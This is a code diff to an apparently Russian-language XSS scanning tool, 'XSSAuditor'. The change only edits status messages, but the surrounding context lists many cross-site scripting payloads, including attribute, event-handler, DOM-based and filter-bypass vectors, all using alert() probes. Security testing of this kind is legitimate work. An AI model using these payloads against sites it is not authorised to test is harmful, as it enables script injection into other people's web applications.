@@ -102,7 +102,7 @@ class XSSAuditor:
         ]
         payloads.extend(basic_payloads)
 
-        print("Загрузка векторов для атрибутов...")
+        print("Загрузка векторов для атрибутов")
         attribute_payloads = [
             '" onmouseover="alert(\'XSS\')',
             '\' onfocus=\'alert("XSS")\' autofocus',
@@ -118,7 +118,7 @@ class XSSAuditor:
             'data:text/html,<script>alert("XSS")</script>',
         ]
         payloads.extend(attribute_payloads)
-        print("Загрузка полиморфных векторов...")
+        print("Загрузка полиморфных векторов")
         polymorphic_payloads = [
             '<scr<script>ipt>alert(1)</scr</script>ipt>',
             '<scr\x00ipt>alert(1)</scr\x00ipt>',
@@ -134,7 +134,7 @@ class XSSAuditor:
         ]
         payloads.extend(polymorphic_payloads)
 
-        print("[*] Загрузка векторов событий...")
+        print("[*] Загрузка векторов событий")
         event_payloads = [
             '<BODY ONLOAD=alert("XSS")>',
             '<body onload=alert(1)>',
@@ -155,7 +155,7 @@ class XSSAuditor:
         ]
         payloads.extend(event_payloads)
 
-        print("[*] Загрузка HTML5 векторов...")
+        print("[*] Загрузка HTML5 векторов")
         html5_payloads = [
             '<details open ontoggle=alert(1)>',
             '<details ontoggle=alert(1)>',
@@ -169,7 +169,7 @@ class XSSAuditor:
         ]
         payloads.extend(html5_payloads)
 
-        print("Загрузка DOM-based векторов...")
+        print("Загрузка DOM-based векторов")
         dom_payloads = [
             '#<script>alert(1)</script>',
             '#<img src=x onerror=alert(1)>',
@@ -181,7 +181,7 @@ class XSSAuditor:
         ]
         payloads.extend(dom_payloads)
 
-        print("Загрузка векторов для обхода фильтров...")
+        print("Загрузка векторов для обхода фильтров")
         filter_bypass_payloads = [
             '><script>alert(1)</script>',
             '"></script><script>alert(1)</script>',
@@ -205,7 +205,7 @@ class XSSAuditor:
         ]
         payloads.extend(filter_bypass_payloads)
 
-        print("Загрузка контекстных векторов...")
+        print("Загрузка контекстных векторов")
         context_payloads = [
             ';alert(1);//',
             'alert(1)//',
@@ -334,14 +334,14 @@ class XSSAuditor:
                             info['technology_hints'].append(tech)
                         break
 
-            print(f"[+] Заголовок: {info['title']}")
-            print(f"[+] Формы: {info['forms_count']}, Поля: {info['inputs_count']}")
-            print(f"[+] Ссылки: {info['links_count']}, Скрипты: {info['scripts_count']}")
+            print(f"Заголовок: {info['title']}")
+            print(f"Формы: {info['forms_count']}, Поля: {info['inputs_count']}")
+            print(f"Ссылки: {info['links_count']}, Скрипты: {info['scripts_count']}")
             if info['technology_hints']:
-                print(f"[+] Технологии: {', '.join(info['technology_hints'])}")
+                print(f"Технологии: {', '.join(info['technology_hints'])}")
 
         except Exception as e:
-            print(f"[-] Ошибка анализа страницы: {e}")
+            print(f"Ошибка анализа страницы: {e}")
 
         return info
 
@@ -517,7 +517,7 @@ class XSSAuditor:
 
         for url_idx, url in enumerate(test_urls, 1):
             if url_idx % 10 == 0:
-                print(f"[*] Прогресс: {url_idx}/{len(test_urls)}")
+                print(f"Прогресс: {url_idx}/{len(test_urls)}")
 
             try:
                 parsed = urlparse(url)
